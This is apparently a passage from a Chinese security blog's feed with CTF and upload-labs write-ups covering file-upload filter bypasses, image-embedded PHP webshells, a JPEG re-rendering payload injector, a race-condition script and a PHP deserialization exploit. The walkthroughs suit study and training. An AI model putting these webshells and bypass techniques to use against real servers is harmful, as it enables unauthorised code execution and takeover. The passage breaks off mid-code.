class="language-php">function isImage($filename)&#123;    $types &#x3D; &#39;.jpeg|.png|.gif&#39;;    if(file_exists($filename))&#123;        $info &#x3D; getimagesize($filename);        $ext &#x3D; image_type_to_extension($info[2]);        if(stripos($types,$ext))&#123;            return $ext;        &#125;else&#123;            return false;        &#125;    &#125;else&#123;        return false;    &#125;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123;    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $res &#x3D; isImage($temp_file);    if(!$res)&#123;        $msg &#x3D; &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload &#x3D; true;        &#125;        else&#123;            $msg &#x3D; &quot;上传失败&quot;;        &#125;    &#125;&#125;</code></pre><h2 id="解法-12"><a href="#解法-12" class="headerlink" title="解法"></a>解法</h2><p><code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 <code>FALSE</code> 并产生一条 <code>E_WARNING</code> 级的错误信息。<br>但是也可以使用修改文件头标准编码绕过，所以用和Pass-13相同步骤即可绕过。</p><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><pre class="language-php" data-language="php"><code class="language-php">function isImage($filename)&#123;    &#x2F;&#x2F;需要开启php_exif模块    $image_type &#x3D; exif_imagetype($filename);    switch ($image_type) &#123;        case IMAGETYPE_GIF:            return &quot;gif&quot;;            break;        case IMAGETYPE_JPEG:            return &quot;jpg&quot;;            break;        case IMAGETYPE_PNG:            return &quot;png&quot;;            break;            default:            return false;            break;    &#125;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123;    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $res &#x3D; isImage($temp_file);    if(!$res)&#123;        $msg &#x3D; &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload &#x3D; true;        &#125;        else&#123;            $msg &#x3D; &quot;上传失败&quot;;        &#125;    &#125;&#125;</code></pre><h2 id="解法-13"><a href="#解法-13" class="headerlink" title="解法"></a>解法</h2><p><code>$image_type = exif_imagetype($filename);</code><br><code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名。<br>可以使用和前两题相同的操作来绕过。</p><h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2><p>如果想要调用<code>exif_imagetype()</code>这个函数需要系统配置文件开启php_exif模块，即<code>php-ini</code>文件中搜索<code>php_exif</code>将行前的分号删除（分号在这个文件中是注释的含义）。</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;]))&#123;    &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $filetype &#x3D; $_FILES[&#39;upload_file&#39;][&#39;type&#39;];    $tmpname &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $target_path&#x3D;$UPLOAD_ADDR.basename($filename);    &#x2F;&#x2F; 获得上传文件的扩展名    $fileext&#x3D; substr(strrchr($filename,&quot;.&quot;),1);    &#x2F;&#x2F;判断文件后缀与类型，合法才进行上传操作    if(($fileext &#x3D;&#x3D; &quot;jpg&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))        &#123;            &#x2F;&#x2F;使用上传的图片生成新的图片            $im &#x3D; imagecreatefromjpeg($target_path);            if($im &#x3D;&#x3D; false)&#123;                $msg &#x3D; &quot;该文件不是jpg格式的图片！&quot;;            &#125;else&#123;                &#x2F;&#x2F;给新图片指定文件名                srand(time());                $newfilename &#x3D; strval(rand()).&quot;.jpg&quot;;                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;                imagejpeg($im,$newimagepath);                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;                unlink($target_path);                $is_upload &#x3D; true;            &#125;        &#125;        else        &#123;            $msg &#x3D; &quot;上传失败！&quot;;        &#125;    &#125;else if(($fileext &#x3D;&#x3D; &quot;png&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;png&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))        &#123;            &#x2F;&#x2F;使用上传的图片生成新的图片            $im &#x3D; imagecreatefrompng($target_path);            if($im &#x3D;&#x3D; false)&#123;                $msg &#x3D; &quot;该文件不是png格式的图片！&quot;;            &#125;else&#123;                 &#x2F;&#x2F;给新图片指定文件名                srand(time());                $newfilename &#x3D; strval(rand()).&quot;.png&quot;;                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;                imagepng($im,$newimagepath);                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;                unlink($target_path);                $is_upload &#x3D; true;                           &#125;        &#125;        else        &#123;            $msg &#x3D; &quot;上传失败！&quot;;        &#125;    &#125;else if(($fileext &#x3D;&#x3D; &quot;gif&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;gif&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))        &#123;            &#x2F;&#x2F;使用上传的图片生成新的图片            $im &#x3D; imagecreatefromgif($target_path);            if($im &#x3D;&#x3D; false)&#123;                $msg &#x3D; &quot;该文件不是gif格式的图片！&quot;;            &#125;else&#123;                &#x2F;&#x2F;给新图片指定文件名                srand(time());                $newfilename &#x3D; strval(rand()).&quot;.gif&quot;;                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;                imagegif($im,$newimagepath);                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;                unlink($target_path);                $is_upload &#x3D; true;            &#125;        &#125;        else        &#123;            $msg &#x3D; &quot;上传失败！&quot;;        &#125;    &#125;else&#123;        $msg &#x3D; &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    &#125;&#125;</code></pre><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这道题使用的是图片二次渲染：<code>$im = imagecreatefromjpeg($target_path);</code>该函数接受单个参数<code>$filename</code>，该参数保存图像的名称。返回值：成功时此函数返回图像资源标识符，错误时返回<code>FALSE</code>。<br>首先先上传一个基础图片，上传之后得到的图片下载下来（拖出来），然后准备一个一句话木马文件制<br>作图片马：</p><pre class="language-php" data-language="php"><code class="language-php">copy  two-pass_rendering.jpg &#x2F;b + webshell.php &#x2F;a  muma.jpg</code></pre><p>其中&#x2F;b代表二进制文件binary，放在图片后面，&#x2F;a代表文字文件ascii<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673795643512-aeb192d4-a2ef-4a48-8579-807ce70a5b7d.png" alt="62eaa9b1448ffa349f6023a08923ab5.png"><br>生成之后上传，测试连接，但是发现无法连接，把图片用文本形式打开后发现php语句格式前面有缺失（缺少了<code>&lt;</code>），所以在webshell文件前面随便加上一点字符。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796220390-17042861-ee9a-49df-9b1f-081543b12e33.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796269910-ddbfd283-518b-4f3b-aa63-039cae915393.png" alt="image.png"><br>重新合成，发现这次格式不缺失了，但是这样传上去之后还是不行，查阅资料发现，<code>.jpg</code>文件和<code>.gif</code>不同，前者渲染的方式和后者渲染的方式不同，因此选择gif文件的操作难度更低。<br>相同步骤重新操作gif文件，合成之后上传，连接发现成功。</p><h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>先上传一个png图片，得到二次渲染后的图片，用010编辑器打开，对比两个文件二进制编码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807266042-10a77bfa-5273-4d5b-b77e-90108045a054.png" alt="image.png"><br>红色的是不同的，白色的是相同的，因此可以将一句话木马写在白色位置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807548864-217eebd6-c513-4f93-88ad-db8b78867018.png" alt="image.png"><br>然后上传连接</p><h2 id="方法三（尝试）"><a href="#方法三（尝试）" class="headerlink" title="方法三（尝试）"></a>方法三（尝试）</h2><p>可以上传一png结尾的 jpg图片</p><h2 id="png-jpg-图片马制作"><a href="#png-jpg-图片马制作" class="headerlink" title="png jpg 图片马制作"></a>png jpg 图片马制作</h2><p>如果想使用<code>.png</code>文件可以使用以下代码生成图片：（这个代码好像在php8版本会报错）</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img &#x3D; imagecreatetruecolor(32, 32);for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;   $r &#x3D; $p[$y];   $g &#x3D; $p[$y+1];   $b &#x3D; $p[$y+2];   $color &#x3D; imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y &#x2F; 3), 0, $color);&#125;imagepng($img,&#39;.&#x2F;1.png&#39;);?&gt;</code></pre><p>生成之后得到的一句话木马为：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x3D;$_GET[0]($_POST[1]);?&gt;</code></pre><p>可以如下使用：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673872967604-c93e3422-8a31-4184-a1b5-35eae3f284e8.png" alt="image.png"><br>如果想使用<code>jpg</code>文件使用以下代码：（但是由于jpg文件容易损坏，因此可能需要多次生成）</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $miniPayload &#x3D; &quot;&lt;?&#x3D;phpinfo();?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;        die(&#39;php-gd is not installed&#39;);    &#125;    if(!isset($argv[1])) &#123;        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize &#x3D; $pad;        $dis &#x3D; new DataInputStream($argv[1]);        $outStream &#x3D; file_get_contents($argv[1]);        $extraBytes &#x3D; 0;        $correctImage &#x3D; TRUE;        if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;            die(&#39;Incorrect SOI marker&#39;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;            $marker &#x3D; $dis-&gt;readByte();            $size &#x3D; $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;                $startPos &#x3D; $dis-&gt;seek();                $outStreamTmp &#x3D;                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !&#x3D;&#x3D; 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;                            if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos &#x3D; $dis-&gt;seek() - 2;                    $imageStreamSize &#x3D; $stopPos - $startPos;                    $outStream &#x3D;                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream &#x3D; $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;                    die(&#39;Success!&#39;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage &#x3D; TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage &#x3D; FALSE;        if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes &#x3D; (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;            $this-&gt;binData &#x3D; &#39;&#39;;            $this-&gt;order &#x3D; $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData &#x3D; file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData &#x3D; $filename;            &#125;            $this-&gt;size &#x3D; strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#39;End Of File&#39;);            &#125;            $byte &#x3D; substr($this-&gt;binData, 0, 1);            $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#39;End Of File&#39;);            &#125;            $short &#x3D; substr($this-&gt;binData, 0, 2);            $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);        &#125;    &#125;?&gt;</code></pre><p>运行脚本命令：</p><pre class="language-php" data-language="php"><code class="language-php">jpg_payload.php 1.jpg</code></pre><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;    if(move_uploaded_file($temp_file, $upload_file))&#123;        if(in_array($file_ext,$ext_arr))&#123;             $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             unlink($upload_file);             $is_upload &#x3D; true;        &#125;else&#123;            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        &#125;    &#125;else&#123;        $msg &#x3D; &#39;上传失败！&#39;;    &#125;&#125;</code></pre><h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h2><p>这种过滤方法是条件筛选，先上传文件，如果不符合格式再将文件删除。所以可以在文件没被删除时访问即可，利用这个时间差执行，但是时间差很短，所以我们可以直接使用脚本访问。</p><pre class="language-php" data-language="php"><code class="language-php">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;192.168.31.88&#x2F;upload-labs&#x2F;upload&#x2F;webshell.jpg&quot;while True:    html &#x3D; requests.get(url)    if html.status_code &#x3D;&#x3D; 200:        print(&quot;OK&quot;)        break</code></pre><h2 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h2><p>将上传页面和文件包含触发漏洞页面发送到Burp的intruder，然后payload设置为null，即可触发条件竞争漏洞</p><h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;index.php$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;]))&#123;    require_once(&quot;.&#x2F;myupload.php&quot;);    $imgFileName &#x3D;time();    $u &#x3D; new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);    $status_code &#x3D; $u-&gt;upload($UPLOAD_ADDR);    switch ($status_code) &#123;        case 1:            $is_upload &#x3D; true;            $img_path &#x3D; $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg &#x3D; &#39;文件已经被上传，但没有重命名。&#39;;            break;         case -1:            $msg &#x3D; &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;            break;         case -2:            $msg &#x3D; &#39;上传失败，上传目录不可写。&#39;;            break;         case -3:            $msg &#x3D; &#39;上传失败，无法上传该类型文件。&#39;;            break;         case -4:            $msg &#x3D; &#39;上传失败，上传的文件过大。&#39;;            break;         case -5:            $msg &#x3D; &#39;上传失败，服务器已经存在相同名称文件。&#39;;            break;         case -6:            $msg &#x3D; &#39;文件无法上传，文件不能复制到目标目录。&#39;;            break;              default:            $msg &#x3D; &#39;未知错误！&#39;;            break;    &#125;&#125;&#x2F;&#x2F;myupload.phpclass MyUpload&#123;..................   var $cls_arr_ext_accepted &#x3D; array(      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );..................    &#x2F;** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **&#x2F;  function upload( $dir )&#123;        $ret &#x3D; $this-&gt;isUploadedFile();        if( $ret !&#x3D; 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret &#x3D; $this-&gt;setDir( $dir );    if( $ret !&#x3D; 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret &#x3D; $this-&gt;checkExtension();    if( $ret !&#x3D; 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret &#x3D; $this-&gt;checkSize();    if( $ret !&#x3D; 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;        &#x2F;&#x2F; if flag to check if the file exists is set to 1        if( $this-&gt;cls_file_exists &#x3D;&#x3D; 1 )&#123;            $ret &#x3D; $this-&gt;checkFileExists();      if( $ret !&#x3D; 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    &#x2F;&#x2F; if we are here, we are ready to move the file to destination    $ret &#x3D; $this-&gt;move();    if( $ret !&#x3D; 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    &#x2F;&#x2F; check if we need to rename the file    if( $this-&gt;cls_rename_file &#x3D;&#x3D; 1 )&#123;      $ret &#x3D; $this-&gt;renameFile();      if( $ret !&#x3D; 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;        &#x2F;&#x2F; if we are here, everything worked as planned :)    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );    &#125;.................. &#125;;</code></pre><h2 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h2><p>直接上传图片马即可，可以在返回页面中得到图片名称</p><h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name &#x3D; $_POST[&#39;save_name&#39;];        $file_ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) &#123;            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) &#123;                 $is_upload &#x3D; true;            &#125;else&#123;                $msg &#x3D; &#39;上传失败！&#39;;            &#125;        &#125;else&#123;            $msg &#x3D; &#39;禁止保存为该类型文件！&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-14"><a href="#解法-14" class="headerlink" title="解法"></a>解法</h2><p><code>move_uploaded_file</code>这个函数会忽略<code>/</code>，因此可以修改上传的文件名为：<code>webshell.php/.</code>即可成功上传，测试连接成功。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黄河流域公安院校网络空间安全技能挑战赛WP</title>
      <link href="/posts/8e0b6517/"/>
      <url>/posts/8e0b6517/</url>
      
        <content type="html"><![CDATA[<blockquote><p>WP原文：<a href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#</a></p></blockquote><blockquote><p>就做出来了一个ezphp，而且还是靠google原题嗯抄的，学习之路真是任重而道远。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004599199-79d1bc55-533b-463b-b116-f14a209b86d7.png" alt="9956ef16896bd6c730cea9b401218c2.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);$num &#x3D; $_GET[&#39;num&#39;];if (preg_match(&quot;&#x2F;\&#39;|\&quot;|\&#96;| |&lt;|&gt;|?|\^|%|\$&#x2F;&quot;, $num)) &#123;           die(&quot;nononno&quot;);&#125;if (eval(&quot;return $&#123;num&#125; !&#x3D; 2;&quot;) &amp;&amp; $num &#x3D;&#x3D; 0 &amp;&amp; is_numeric($num) !&#x3D; true) &#123; system(&#39;cat flag.php&#39;);&#125; else &#123; echo &#39;2&#39;;&#125;</code></pre><p>题目主要考察的是php的运算符的比较级。<br>payload：<code>?num=1|2</code><br>flag在源代码里面。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001464588-77225b4a-cf0b-4a51-8212-30b8bd77afa1.png" alt="image.png"></p><h2 id="funnyPHP"><a href="#funnyPHP" class="headerlink" title="funnyPHP"></a>funnyPHP</h2><p>上来给出的地址是：<code>/hint.php</code>，页面下为<code>phpinfo()</code>参数页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001660449-14587bf3-10c9-476f-a1e9-22d501efdc52.png" alt="image.png"><br>访问根目录<code>/</code>出现以下情况：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001606854-f0128886-182c-4eb5-9172-6c0387e9e027.png" alt="image.png"><br>这里为 PHP Development Server 启动的服务。然后就出现了本题的考点：</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞"></a>PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</h3><blockquote><p><a href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a><br><a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p></blockquote><p>我最开始在bp中手动输入那个\r\n但是发现不行，经过尝试才知道需要先关闭<code>Updates COntentLength</code>并且打开<code>hide non—printable chars</code>，这两个分别在以下位置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002498712-172f96c6-35b8-4f31-b5f9-d17c822dc312.png" alt="image.png"><br>和<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002518945-25f2f952-9851-4f47-ba31-d199acf26ce3.png" alt="image.png"><br>分别打开之后，按照以下格式发送即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002554239-5388e99a-8075-4082-a0a1-3b696ffb131b.png" alt="image.png"><br>之后就能够获得到puzzle.php的内容。其中考察的是php的反序列化。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class A&#123;    public $sdpc &#x3D; [&quot;welcome&quot; &#x3D;&gt; &quot;yeah, something hidden.&quot;];    function __call($name, $arguments)    &#123;        $this-&gt;$name[$name]();    &#125;&#125;class B&#123;    public $a;    function __construct()    &#123;        $this-&gt;a &#x3D; new A();    &#125;    function __toString()    &#123;        echo $this-&gt;a-&gt;sdpc[&quot;welcome&quot;]; &#x2F;&#x2F;对大家表示欢迎    &#125;&#125;class C&#123;    public $b;    protected $c;    function __construct()&#123;        $this-&gt;c &#x3D; new B();    &#125;    function __destruct()&#123;        $this-&gt;b ? $this-&gt;c-&gt;sdpc(&#39;welcom&#39;) : &#39;welcome!&#39;.$this-&gt;c; &#x2F;&#x2F;变着法欢迎大家    &#125;&#125;class Evil&#123;    function getflag() &#123;        echo file_get_contents(&#39;&#x2F;fl4g&#39;);    &#125;&#125;if(isset($_POST[&#39;sdpc&#39;])) &#123;    unserialize($_POST[&#39;sdpc&#39;]);&#125; else &#123;    serialize(new C());&#125;?&gt;</code></pre><p>exp.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class A&#123;    public $sdpc;    function __construct() &#123;        $this-&gt;sdpc &#x3D; array(&quot;sdpc&quot; &#x3D;&gt; array(new Evil(),&#39;getflag&#39;));    &#125;    function __call($name, $arguments)    &#123;        $name[$arguments]();    &#125;&#125;class B&#123;    public $a;    function __construct()    &#123;        $this-&gt;a &#x3D; new A();    &#125;    function __toString()    &#123;        echo $this-&gt;a-&gt;sdpc[&quot;welcome&quot;]; &#x2F;&#x2F;对大家表示欢迎    &#125;&#125;class C&#123;    public $b;    protected $c;    function __construct()    &#123;        $this-&gt;c &#x3D; new A();    &#125;    function __destruct()    &#123;        $this-&gt;b ? $this-&gt;c-&gt;sdpc(&#39;welcom&#39;) : &#39;welcome!&#39; . $this-&gt;c; &#x2F;&#x2F;设置 b ，触发 ___call    &#125;&#125;class Evil&#123;    function getflag()    &#123;        echo &#39;1&#39;;        file_get_contents(&#39;&#x2F;fl4g&#39;);    &#125;&#125;$ca &#x3D; new A();$cb &#x3D; new B();$cc &#x3D; new C();$cc-&gt;b &#x3D; &#39;sp4c1ous&#39;;echo urlencode(serialize($cc));</code></pre><p>用post传入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678003313844-de470c08-436b-496a-b1f6-193a5bd1252e.png" alt="image.png"></p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><blockquote><p><a href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p></blockquote><p>pearcmd的利用，但是并不会。先把官方wp粘在这里吧。</p><pre class="language-php" data-language="php"><code 